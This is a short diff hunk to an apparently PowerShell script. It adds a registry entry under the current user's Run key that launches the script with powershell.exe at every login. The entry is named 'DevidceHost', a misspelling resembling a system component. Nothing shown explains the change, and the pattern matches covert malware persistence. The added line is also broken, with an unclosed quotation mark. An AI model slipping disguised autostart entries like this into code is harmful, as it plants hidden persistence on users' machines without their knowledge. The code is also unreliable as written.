@@ -68,4 +68,10 @@ catch {
     exit 1
 }
 
+New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
+                 -Name "DevidceHost" `
+                 -Value "powershell.exe -NoProfile -File $ScriptPath
+
+
+
 
